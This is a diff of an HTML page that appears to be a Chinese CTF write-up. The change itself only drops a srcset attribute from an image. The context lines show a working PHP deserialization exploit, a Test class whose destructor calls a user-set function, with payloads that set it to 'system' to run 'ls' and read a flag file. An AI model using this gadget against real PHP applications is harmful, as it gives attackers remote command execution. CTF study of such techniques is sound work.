@@ -238,7 +238,7 @@
     ?&gt;</code></pre>
 <p>反序列化Test,利用call_user_func函数进行绕过，文件名匹配可以用反序列化绕过</p>
 <pre><code>反序列化Test,利用call_user_func函数进行绕过，文件名匹配可以用反序列化绕过</code></pre><p><code>&lt;?php</code><br><code>class Test {</code><br>    <code>var $p = &quot;Y-m-d h:i:s a&quot;;</code><br>    <code>var $func = &quot;date&quot;;</code><br>    <code>function __destruct() {</code><br>        <code>if ($this-&gt;func != &quot;&quot;) {</code><br>            <code>echo gettime($this-&gt;func, $this-&gt;p);</code><br>        <code>}</code><br>    <code>}</code><br><code>}</code></p>
-<p><code>$a = new Test();</code><br><code>$a -&gt; p=&quot;ls ../../../../../&quot;;</code><br><code>$a -&gt; func = &quot;system&quot;;</code><br><code>print_r(urlencode(serialize($a)));</code><br><img src="https://img-blog.csdnimg.cn/20200518171039755.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NoZW5aSUR1,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><code>$a = new Test();</code><br><code>$a -&gt; p=&quot;ls ../../../../../&quot;;</code><br><code>$a -&gt; func = &quot;system&quot;;</code><br><code>print_r(urlencode(serialize($a)));</code><br><img src="https://img-blog.csdnimg.cn/20200518171039755.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NoZW5aSUR1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p><code>$a = new Test();</code></p>
 <p> <code>$a -&gt; p=&quot;cat /tmp/flagoefiu4r93&quot;;</code></p>
 <p> <code>$a -&gt; func = &quot;system&quot;; print_r(urlencode(serialize($a)));</code></p>
